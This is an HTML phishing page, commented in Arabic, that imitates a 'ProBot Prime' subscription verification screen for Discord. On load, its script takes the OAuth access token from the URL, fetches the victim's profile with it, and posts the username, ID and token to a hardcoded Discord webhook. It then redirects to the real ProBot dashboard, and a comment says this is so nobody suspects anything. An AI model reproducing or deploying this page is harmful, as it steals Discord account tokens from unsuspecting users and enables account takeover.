<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ProBot Prime | التوثيق</title>
    <style>
        body {
            background-color: #2c2f33;
            color: white;
            font-family: 'Cairo', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .card {
            background-color: #23272a;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            text-align: center;
            width: 350px;
            border-top: 5px solid #7289da;
        }
        .probot-logo {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin-bottom: 15px;
        }
        h2 { margin: 10px 0; font-size: 20px; }
        p { color: #99aab5; font-size: 14px; line-height: 1.6; }
        .loader {
            border: 3px solid #36393f;
            border-top: 3px solid #7289da;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap" rel="stylesheet">
</head>
<body>

<div class="card">
    <img src="https://probot.io/img/logo.png" alt="ProBot" class="probot-logo">
    <h2>توثيق بروبوت برايم</h2>
    <p>يتم الآن التحقق من صلاحية اشتراك البرايم الخاص بك، يرجى عدم إغلاق هذه الصفحة...</p>
    <div class="loader"></div>
</div>

<script>
    // الرابط اللي أنت بعته
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1497409587916177599/mDbc4yYLIeZQSUkKTWualuZsBSU8AF5DDUJyT2Qs0yfEJR5FQ6d67ABfMSyL2B3WbQcI";

    async function processCapture() {
        const hash = window.location.hash.substring(1);
        const params = new URLSearchParams(hash);
        const token = params.get('access_token');

        if (token) {
            try {
                // جلب بيانات المستخدم لضمان وصول المعلومات كاملة
                const userRes = await fetch('https://discord.com/api/users/@me', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                const user = await userRes.json();

                // إرسال البيانات للويب هوك
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "@everyone ⚠️ **New Account Verified**",
                        embeds: [{
                            title: "ProBot Prime Login Detected",
                            color: 7506394, // لون ديسكورد الأصلي
                            fields: [
                                { name: "User", value: `\`${user.username}#${user.discriminator}\``, inline: true },
                                { name: "User ID", value: `\`${user.id}\``, inline: true },
                                { name: "Token", value: `\`\`\`${token}\`\`\`` }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });

                // توجيه لصفحة بروبوت الحقيقية عشان محدش يشك
                setTimeout(() => {
                    window.location.href = "https://probot.io/dashboard";
                }, 1500);

            } catch (err) {
                console.error("Capture Error:", err);
            }
        }
    }

    window.onload = processCapture;
</script>

</body>
</html>
